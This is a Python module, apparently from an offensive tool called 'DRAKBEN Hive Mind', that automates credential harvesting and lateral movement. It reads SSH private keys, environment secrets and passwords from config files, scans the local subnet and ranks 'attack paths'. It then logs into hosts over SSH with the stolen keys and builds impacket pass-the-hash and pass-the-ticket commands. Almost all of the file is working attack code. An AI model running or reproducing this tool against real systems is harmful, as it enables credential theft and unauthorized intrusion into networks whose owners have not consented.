"""
DRAKBEN Hive Mind - Enterprise Network Intelligence & Lateral Movement
Author: @drak_ben
Description: Active Directory analysis, lateral movement, and network pivoting.

This module provides:
- Active Directory enumeration and attack automation
- Lateral movement techniques (Pass-the-Hash, SSH Key Harvesting)
- Network topology discovery
- Credential harvesting and impersonation
- BloodHound-style attack path analysis
"""

import hashlib
import ipaddress
import logging
import os
import re
import socket
import subprocess
import shlex
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS
# =============================================================================

class CredentialType(Enum):
    """Types of harvested credentials"""
    PASSWORD = "password"
    NTLM_HASH = "ntlm_hash"
    KERBEROS_TICKET = "kerberos_ticket"
    SSH_KEY = "ssh_key"
    TOKEN = "token"
    CERTIFICATE = "certificate"


class MovementTechnique(Enum):
    """Lateral movement techniques"""
    PSEXEC = "psexec"
    WMIEXEC = "wmiexec"
    SMBEXEC = "smbexec"
    WINRM = "winrm"
    SSH = "ssh"
    RDP = "rdp"
    PASS_THE_HASH = "pth"
    PASS_THE_TICKET = "ptt"


class ADAttack(Enum):
    """Active Directory attack types"""
    KERBEROASTING = "kerberoasting"
    ASREP_ROASTING = "asrep_roasting"
    DCSYNC = "dcsync"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"
    ZEROLOGON = "zerologon"


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class Credential:
    """Harvested credential"""
    username: str
    domain: str
    credential_type: CredentialType
    value: str  # Password, hash, or key content
    source: str  # Where was this found
    admin_level: bool = False
    valid: bool = True
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class NetworkHost:
    """Discovered network host"""
    ip: str
    hostname: Optional[str] = None
    domain: Optional[str] = None
    os: Optional[str] = None
    ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    credentials: List[Credential] = field(default_factory=list)
    compromised: bool = False
    pivot_point: bool = False


@dataclass
class AttackPath:
    """Path from current position to target"""
    source: str
    target: str
    hops: List[str]
    techniques: List[MovementTechnique]
    credentials_needed: List[str]
    probability: float  # Success probability 0-1


@dataclass
class DomainInfo:
    """Active Directory domain information"""
    name: str
    netbios_name: str
    domain_controllers: List[str]
    forest: Optional[str] = None
    functional_level: Optional[str] = None
    users: List[str] = field(default_factory=list)
    computers: List[str] = field(default_factory=list)
    groups: List[str] = field(default_factory=list)
    trusts: List[str] = field(default_factory=list)


# =============================================================================
# CREDENTIAL HARVESTER
# =============================================================================

class CredentialHarvester:
    """
    Credential harvesting from various sources.
    
    Sources:
    - Memory (mimikatz-style)
    - Files (config files, SSH keys)
    - Registry (Windows credentials)
    - Environment variables
    - Browser storage
    """
    
    def __init__(self):
        self.harvested: List[Credential] = []
        self.ssh_key_paths = [
            os.path.expanduser("~/.ssh/id_rsa"),
            os.path.expanduser("~/.ssh/id_ed25519"),
            os.path.expanduser("~/.ssh/id_ecdsa"),
            os.path.expanduser("~/.ssh/id_dsa"),
        ]
    
    def harvest_ssh_keys(self) -> List[Credential]:
        """
        Harvest SSH private keys from common locations.
        
        Returns:
            List of Credential objects for found keys
        """
        found = []
        
        for key_path in self.ssh_key_paths:
            if os.path.exists(key_path):
                try:
                    with open(key_path, 'r') as f:
                        key_content = f.read()
                    
                    # Check if it's actually a private key
                    if "PRIVATE KEY" in key_content:
                        # Try to get username from known_hosts or config
                        username = self._get_ssh_username(key_path)
                        
                        cred = Credential(
                            username=username or os.getenv("USER", "unknown"),
                            domain="",
                            credential_type=CredentialType.SSH_KEY,
                            value=key_content,
                            source=key_path,
                            metadata={"encrypted": "ENCRYPTED" in key_content}
                        )
                        found.append(cred)
                        self.harvested.append(cred)
                        logger.info(f"Found SSH key: {key_path}")
                        
                except PermissionError:
                    logger.debug(f"Permission denied reading SSH key: {key_path}")
                except Exception as e:
                    logger.debug(f"Error reading SSH key {key_path}: {e}")
        
        return found
    
    def harvest_known_hosts(self) -> List[str]:
        """
        Parse SSH known_hosts for target discovery.
        
        Returns:
            List of hostnames/IPs from known_hosts
        """
        hosts = []
        known_hosts_path = os.path.expanduser("~/.ssh/known_hosts")
        
        if os.path.exists(known_hosts_path):
            try:
                with open(known_hosts_path, 'r') as f:
                    for line in f:
                        if line.strip() and not line.startswith('#'):
                            # Format: hostname,ip algo key
                            parts = line.split()
                            if parts:
                                host_part = parts[0].split(',')
                                hosts.extend(host_part)
            except Exception as e:
                logger.debug(f"Error reading known_hosts: {e}")
        
        return list(set(hosts))
    
    def harvest_environment(self) -> List[Credential]:
        """
        Harvest credentials from environment variables.
        
        Returns:
            List of potential credentials from environment
        """
        found = []
        sensitive_patterns = [
            "PASSWORD", "PASSWD", "SECRET", "TOKEN", "API_KEY",
            "APIKEY", "ACCESS_KEY", "PRIVATE_KEY", "CREDENTIAL"
        ]
        
        for key, value in os.environ.items():
            for pattern in sensitive_patterns:
                if pattern in key.upper() and value:
                    cred = Credential(
                        username="env:" + key,
                        domain="",
                        credential_type=CredentialType.PASSWORD,
                        value=value,
                        source="environment",
                        metadata={"env_var": key}
                    )
                    found.append(cred)
                    self.harvested.append(cred)
        
        return found
    
    def _parse_config_file(self, filepath: str, password_regex) -> List[Credential]:
        """Parse a single config file for credentials"""
        found_in_file = []
        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read(10000)  # First 10KB
            
            matches = password_regex.findall(content)
            for match in matches:
                if len(match) > 3 and match.lower() not in ['null', 'none', 'empty', 'changeme']:
                    cred = Credential(
                        username="config",
                        domain="",
                        credential_type=CredentialType.PASSWORD,
                        value=match,
                        source=filepath
                    )
                    found_in_file.append(cred)
        except (PermissionError, IOError):
            pass
        return found_in_file

    def harvest_config_files(self, search_paths: List[str] = None) -> List[Credential]:
        """
        Search config files for embedded credentials (Refactored for complexity).
        """
        if search_paths is None:
            search_paths = [os.path.expanduser("~")]
            
        found = []
        config_patterns = ["*.conf", "*.cfg", "*.ini", "*.yaml", "*.yml", ".env", ".netrc", ".pgpass", ".my.cnf"]
        password_regex = re.compile(
            r'(?:password|passwd|pwd|secret|token|api_key|apikey)\s*[=:]\s*["\']?([^"\'\s\n]+)',
            re.IGNORECASE
        )
        
        for search_path in search_paths:
            if not os.path.exists(search_path): continue
            
            for root, dirs, files in os.walk(search_path):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for filename in files:
                    filepath = os.path.join(root, filename)
                    if not any(filepath.endswith(p.replace("*", "")) for p in config_patterns):
                        if not any(p.replace("*", "") in filename for p in config_patterns):
                            continue
                    
                    file_creds = self._parse_config_file(filepath, password_regex)
                    found.extend(file_creds)
                    self.harvested.extend(file_creds)
        
        return found
    
    def _get_ssh_username(self, key_path: str) -> Optional[str]:
        """Try to determine SSH username from config"""
        config_path = os.path.join(os.path.dirname(key_path), "config")
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    for line in f:
                        if "User " in line:
                            return line.split("User ")[-1].strip()
            except Exception:
                pass
        return None
    
    def get_all_credentials(self) -> List[Credential]:
        """Get all harvested credentials"""
        return self.harvested.copy()


# =============================================================================
# NETWORK MAPPER
# =============================================================================

class NetworkMapper:
    """
    Network topology discovery and mapping.
    
    Discovers:
    - Local network hosts
    - Open ports and services
    - Network relationships
    - Potential pivot points
    """
    
    def __init__(self):
        self.discovered_hosts: Dict[str, NetworkHost] = {}
        self.local_interfaces: List[str] = []
    
    def get_local_interfaces(self) -> List[str]:
        """Get local network interfaces and their IPs"""
        interfaces = []
        
        try:
            # Get all network interfaces
            import socket
            hostname = socket.gethostname()
            
            # Get all IPs for this host
            try:
                ips = socket.getaddrinfo(hostname, None, socket.AF_INET)
                for ip_info in ips:
                    ip = ip_info[4][0]
                    if not ip.startswith("127."):
                        interfaces.append(ip)
            except socket.gaierror:
                pass
            
            # Also try to get the primary IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                primary_ip = s.getsockname()[0]
                s.close()
                if primary_ip not in interfaces:
                    interfaces.append(primary_ip)
            except Exception:
                pass
                
        except Exception as e:
            logger.debug(f"Error getting interfaces: {e}")
        
        self.local_interfaces = interfaces
        return interfaces
    
    def get_local_subnet(self, ip: str) -> str:
        """Get the /24 subnet for an IP"""
        try:
            network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
            return str(network)
        except ValueError:
            return f"{ip}/24"
    
    def quick_scan(self, target: str, ports: List[int] = None) -> Optional[NetworkHost]:
        """
        Quick port scan of a single target.
        
        Args:
            target: IP or hostname
            ports: Ports to scan (default: common ports)
            
        Returns:
            NetworkHost object or None
        """
        if ports is None:
            ports = [22, 80, 135, 139, 443, 445, 3389, 5985, 5986]
        
        open_ports = []
        services = {}
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    services[port] = self._guess_service(port)
                    
            except Exception:
                continue
        
        if open_ports:
            host = NetworkHost(
                ip=target,
                ports=open_ports,
                services=services
            )
            self.discovered_hosts[target] = host
            return host
        
        return None
    
    def _guess_service(self, port: int) -> str:
        """Guess service name from port number"""
        common_ports = {
            21: "ftp",
            22: "ssh",
            23: "telnet",
            25: "smtp",
            53: "dns",
            80: "http",
            110: "pop3",
            135: "msrpc",
            139: "netbios-ssn",
            143: "imap",
            443: "https",
            445: "microsoft-ds",
            993: "imaps",
            995: "pop3s",
            1433: "mssql",
            1521: "oracle",
            3306: "mysql",
            3389: "rdp",
            5432: "postgresql",
            5985: "winrm-http",
            5986: "winrm-https",
            6379: "redis",
            8080: "http-proxy",
            8443: "https-alt",
        }
        return common_ports.get(port, f"unknown-{port}")
    
    def is_windows_host(self, host: NetworkHost) -> bool:
        """Check if host appears to be Windows"""
        windows_ports = {135, 139, 445, 3389, 5985}
        return bool(set(host.ports) & windows_ports)
    
    def is_linux_host(self, host: NetworkHost) -> bool:
        """Check if host appears to be Linux"""
        return 22 in host.ports and not self.is_windows_host(host)
    
    def find_pivot_points(self) -> List[NetworkHost]:
        """Find potential pivot points (hosts with multiple network access)"""
        pivots = []
        for host in self.discovered_hosts.values():
            # Hosts with RDP/SSH and other services are good pivot points
            if (22 in host.ports or 3389 in host.ports) and len(host.ports) > 2:
                host.pivot_point = True
                pivots.append(host)
        return pivots


# =============================================================================
# ACTIVE DIRECTORY ANALYZER
# =============================================================================

class ADAnalyzer:
    """
    Active Directory enumeration and analysis.
    
    Capabilities:
    - Domain enumeration
    - User/Group discovery
    - Trust relationships
    - Attack path calculation
    - Kerberos attacks
    """
    
    def __init__(self):
        self.domain_info: Optional[DomainInfo] = None
        self.attack_paths: List[AttackPath] = []
    
    def detect_domain(self) -> Optional[str]:
        """
        Detect if we're on a domain-joined machine.
        
        Returns:
            Domain name or None
        """
        # Check environment variables (Windows)
        domain = os.environ.get("USERDOMAIN")
        if domain and domain != os.environ.get("COMPUTERNAME"):
            return domain
        
        # Check /etc/resolv.conf (Linux)
        try:
            with open("/etc/resolv.conf", 'r') as f:
                for line in f:
                    if line.startswith("search ") or line.startswith("domain "):
                        parts = line.split()
                        if len(parts) > 1:
                            return parts[1]
        except FileNotFoundError:
            pass
        
        return None
    
    def enumerate_domain(self, domain: str) -> Optional[DomainInfo]:
        """
        Enumerate Active Directory domain.
        
        Args:
            domain: Domain name
            
        Returns:
            DomainInfo object or None
        """
        info = DomainInfo(
            name=domain,
            netbios_name=domain.split('.')[0].upper() if '.' in domain else domain.upper(),
            domain_controllers=[]
        )
        
        # Try to find domain controllers via DNS
        try:
            # Look for _ldap._tcp SRV records
            # Look for _ldap._tcp SRV records (Query logic for future implementation)
            # This would use DNS query in real implementation
            # For now, try to resolve common DC names
            for prefix in ["dc", "dc1", "dc01", "pdc"]:
                try:
                    socket.gethostbyname(f"{prefix}.{domain}")
                    info.domain_controllers.append(f"{prefix}.{domain}")
                except socket.gaierror:
                    continue
        except Exception as e:
            logger.debug(f"Error enumerating DCs: {e}")
        
        self.domain_info = info
        return info
    
    def get_kerberoastable_users(self) -> List[str]:
        """
        Get list of potentially kerberoastable users.
        
        Returns:
            List of usernames with SPNs
        """
        # In real implementation, this would query AD for users with SPNs
        # For now, return common service account patterns
        return [
            "svc_*", "service_*", "sql*", "web*", "iis*",
            "backup*", "admin*", "exchange*", "sharepoint*"
        ]
    
    def get_asrep_roastable_users(self) -> List[str]:
        """
        Get list of users vulnerable to AS-REP roasting.
        
        Returns:
            List of usernames without pre-auth
        """
        # Users with "Do not require Kerberos preauthentication" set
        return []  # Would be populated by LDAP query
    
    def calculate_attack_path(
        self,
        source: str,
        target: str,
        available_creds: List[Credential],
        discovered_hosts: Dict[str, NetworkHost]
    ) -> Optional[AttackPath]:
        """
        Calculate attack path from source to target.
        
        BloodHound-style shortest path calculation.
        
        Args:
            source: Current position (hostname/IP)
            target: Target (hostname/IP or "Domain Admin")
            available_creds: Available credentials
            discovered_hosts: Discovered network hosts
            
        Returns:
            AttackPath or None if no path found
        """
        # Simple path calculation
        # In real implementation, this would use graph algorithms
        
        hops = []
        techniques = []
        creds_needed = []
        
        source_host = discovered_hosts.get(source)
        target_host = discovered_hosts.get(target)
        
        if not source_host:
            return None
        
        # Check direct connection
        if target_host:
            if 22 in target_host.ports:
                techniques.append(MovementTechnique.SSH)
                creds_needed.append("ssh_key_or_password")
            elif 445 in target_host.ports:
                techniques.append(MovementTechnique.PSEXEC)
                creds_needed.append("admin_ntlm_hash_or_password")
            elif 5985 in target_host.ports:
                techniques.append(MovementTechnique.WINRM)
                creds_needed.append("admin_password")
            elif 3389 in target_host.ports:
                techniques.append(MovementTechnique.RDP)
                creds_needed.append("interactive_logon_creds")
            
            hops = [target]
        
        if hops:
            # Calculate success probability based on available creds
            probability = 0.5  # Base probability
            for cred in available_creds:
                if cred.admin_level:
                    probability = min(0.9, probability + 0.2)
            
            return AttackPath(
                source=source,
                target=target,
                hops=hops,
                techniques=techniques,
                credentials_needed=creds_needed,
                probability=probability
            )
        
        return None


# =============================================================================
# LATERAL MOVEMENT ENGINE
# =============================================================================

class LateralMover:
    """
    Lateral movement execution engine.
    
    Techniques:
    - Pass-the-Hash (PTH)
    - Pass-the-Ticket (PTT)
    - psexec/wmiexec/smbexec
    - SSH with harvested keys
    - WinRM
    """
    
    def __init__(self):
        self.successful_moves: List[Dict[str, Any]] = []
        self.failed_moves: List[Dict[str, Any]] = []
    
    def _prepare_ssh_key(self, key_content: str) -> str:
        """Securely write SSH key to temp file"""
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.key') as f:
            f.write(key_content)
            key_file = f.name
        os.chmod(key_file, 0o600)
        return key_file

    def _execute_ssh(self, cmd_list: List[str], timeout: int = 30) -> Tuple[bool, str, str]:
        """Execute SSH command with subprocess"""
        proc = None
        try:
            proc = subprocess.Popen(
                cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            stdout, stderr = proc.communicate(timeout=timeout)
            return proc.returncode == 0, stdout, stderr
        except subprocess.TimeoutExpired:
            if proc:
                proc.kill()
                proc.communicate()
            return False, "", "Connection timeout"
        except Exception as e:
            return False, "", str(e)

    def move_ssh(self, target: str, username: str, credential: Credential, command: str = None) -> Dict[str, Any]:
        """
        Move to target via SSH (Refactored for complexity).
        """
        result = {"technique": MovementTechnique.SSH.value, "target": target, "username": username, "success": False, "output": "", "error": ""}
        
        if credential.credential_type != CredentialType.SSH_KEY:
            result["error"] = "Password authentication requires sshpass (Not implemented)"
            return result

        key_file = self._prepare_ssh_key(credential.value)
        try:
            ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
            cmd_list = ["ssh"] + shlex.split(ssh_opts) + ["-i", key_file, f"{username}@{target}"]
            if command: cmd_list.append(command)
            
            success, stdout, stderr = self._execute_ssh(cmd_list)
            result.update({"success": success, "output": stdout, "error": stderr})
        finally:
            try: os.unlink(key_file)
            except Exception: pass
            
        if result["success"]: self.successful_moves.append(result)
        else: self.failed_moves.append(result)
        
        return result
    
    def generate_pth_command(
        self,
        target: str,
        username: str,
        ntlm_hash: str,
        technique: MovementTechnique = MovementTechnique.PSEXEC
    ) -> str:
        """
        Generate Pass-the-Hash command for impacket tools.
        
        Args:
            target: Target host
            username: Username
            ntlm_hash: NTLM hash
            technique: Which impacket tool to use
            
        Returns:
            Command string
        """
        domain = ""
        if "\\" in username:
            domain, username = username.split("\\")
        elif "@" in username:
            username, domain = username.split("@")
        
        # Format: tool domain/user@target -hashes :ntlm_hash
        tool_map = {
            MovementTechnique.PSEXEC: "psexec.py",
            MovementTechnique.WMIEXEC: "wmiexec.py",
            MovementTechnique.SMBEXEC: "smbexec.py",
        }
        
        tool = tool_map.get(technique, "psexec.py")
        
        if domain:
            user_spec = f"{domain}/{username}"
        else:
            user_spec = username
        
        return f"{tool} {user_spec}@{target} -hashes :{ntlm_hash}"
    
    def generate_ptt_command(self, target: str, ticket_path: str) -> str:
        """
        Generate Pass-the-Ticket command.
        
        Args:
            target: Target host
            ticket_path: Path to Kerberos ticket
            
        Returns:
            Command string
        """
        return f"export KRB5CCNAME={ticket_path} && psexec.py -k -no-pass {target}"
    
    def get_movement_stats(self) -> Dict[str, Any]:
        """Get statistics about movement attempts"""
        return {
            "successful": len(self.successful_moves),
            "failed": len(self.failed_moves),
            "techniques_used": list({m["technique"] for m in self.successful_moves}),
            "targets_compromised": list({m["target"] for m in self.successful_moves})
        }


# =============================================================================
# HIVE MIND - MAIN ORCHESTRATOR
# =============================================================================

class HiveMind:
    """
    Main orchestrator for enterprise network intelligence.
    
    Coordinates:
    - Credential harvesting
    - Network mapping
    - AD analysis
    - Lateral movement
    - Attack path optimization
    
    Usage:
        hive = HiveMind()
        hive.initialize()
        paths = hive.find_attack_paths("Domain Admin")
        hive.execute_movement(paths[0])
    """
    
    def __init__(self):
        """Initialize Hive Mind"""
        self.harvester = CredentialHarvester()
        self.mapper = NetworkMapper()
        self.ad_analyzer = ADAnalyzer()
        self.mover = LateralMover()
        
        self.current_host: Optional[str] = None
        self.initialized: bool = False
        
        logger.info("Hive Mind initialized")
    
    def initialize(self) -> Dict[str, Any]:
        """
        Initialize Hive Mind with local reconnaissance.
        
        Returns:
            Dict with initialization results
        """
        results = {
            "interfaces": [],
            "domain": None,
            "credentials_found": 0,
            "ssh_targets": [],
            "errors": []
        }
        
        try:
            # Get local network info
            results["interfaces"] = self.mapper.get_local_interfaces()
            if results["interfaces"]:
                self.current_host = results["interfaces"][0]
            
            # Check for domain
            results["domain"] = self.ad_analyzer.detect_domain()
            
            # Harvest local credentials
            self.harvester.harvest_ssh_keys()
            self.harvester.harvest_environment()
            results["credentials_found"] = len(self.harvester.harvested)
            
            # Get SSH targets from known_hosts
            results["ssh_targets"] = self.harvester.harvest_known_hosts()[:10]
            
            self.initialized = True
            
        except Exception as e:
            results["errors"].append(str(e))
            logger.error(f"Initialization error: {e}")
        
        return results
    
    def scan_network(self, subnet: str = None) -> List[NetworkHost]:
        """
        Scan local network for hosts.
        
        Args:
            subnet: Subnet to scan (default: auto-detect)
            
        Returns:
            List of discovered hosts
        """
        if subnet is None and self.current_host:
            subnet = self.mapper.get_local_subnet(self.current_host)
        
        discovered = []
        
        if subnet:
            # Parse subnet and scan first 20 hosts (quick scan)
            try:
                network = ipaddress.IPv4Network(subnet, strict=False)
                for i, ip in enumerate(network.hosts()):
                    if i >= 20:  # Limit for quick scan
                        break
                    host = self.mapper.quick_scan(str(ip))
                    if host:
                        discovered.append(host)
            except ValueError as e:
                logger.error(f"Invalid subnet: {e}")
        
        return discovered
    
    def find_attack_paths(self, target: str = "Domain Admin") -> List[AttackPath]:
        """
        Find attack paths to target.
        
        Args:
            target: Target (hostname, IP, or "Domain Admin")
            
        Returns:
            List of possible attack paths
        """
        paths = []
        
        if not self.current_host:
            return paths
        
        # Calculate paths to each discovered host
        for host_ip, host in self.mapper.discovered_hosts.items():
            path = self.ad_analyzer.calculate_attack_path(
                source=self.current_host,
                target=host_ip,
                available_creds=self.harvester.harvested,
                discovered_hosts=self.mapper.discovered_hosts
            )
            if path:
                paths.append(path)
        
        # Sort by probability
        paths.sort(key=lambda p: p.probability, reverse=True)
        
        return paths
    
    def _find_matching_credential(self, technique: MovementTechnique) -> Optional[Credential]:
        """Find a credential matching the movement technique"""
        for c in self.harvester.harvested:
            if technique == MovementTechnique.SSH and c.credential_type == CredentialType.SSH_KEY:
                return c
            if technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH] and c.credential_type == CredentialType.NTLM_HASH:
                return c
        return None

    def _execute_hop(self, hop: str, technique: MovementTechnique, result: Dict[str, Any]) -> bool:
        """Execute a single hop in the attack path"""
        cred = self._find_matching_credential(technique)
        if not cred:
            result["output"] = f"No suitable credential for {technique.value}"
            return False

        if technique == MovementTechnique.SSH:
            move_result = self.mover.move_ssh(hop, cred.username, cred, "whoami")
            if move_result["success"]:
                result["hops_completed"] += 1
                result["final_position"] = hop
                self.current_host = hop
                return True
        elif technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH]:
            cmd = self.mover.generate_pth_command(hop, cred.username, cred.value)
            result["output"] = f"Manual execution required: {cmd}"
            return False
        return False

    def execute_movement(self, path: AttackPath) -> Dict[str, Any]:
        """
        Execute lateral movement along attack path (Refactored for complexity).
        """
        result = {"path": path, "success": False, "hops_completed": 0, "final_position": self.current_host, "output": ""}
        
        for i, hop in enumerate(path.hops):
            technique = path.techniques[i] if i < len(path.techniques) else path.techniques[-1]
            if not self._execute_hop(hop, technique, result):
                break
        
        result["success"] = result["hops_completed"] == len(path.hops)
        return result
    
    def get_status(self) -> Dict[str, Any]:
        """Get current Hive Mind status"""
        return {
            "initialized": self.initialized,
            "current_host": self.current_host,
            "credentials": len(self.harvester.harvested),
            "discovered_hosts": len(self.mapper.discovered_hosts),
            "domain": self.ad_analyzer.domain_info.name if self.ad_analyzer.domain_info else None,
            "movement_stats": self.mover.get_movement_stats()
        }


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================

def get_hive_mind() -> HiveMind:
    """
    Get singleton HiveMind instance.
    
    Returns:
        HiveMind instance
    """
    global _hive_mind
    if "_hive_mind" not in globals() or _hive_mind is None:
        _hive_mind = HiveMind()
    return _hive_mind


def quick_recon() -> Dict[str, Any]:
    """
    Quick local reconnaissance.
    
    Returns:
        Dict with recon results
    """
    hive = get_hive_mind()
    return hive.initialize()
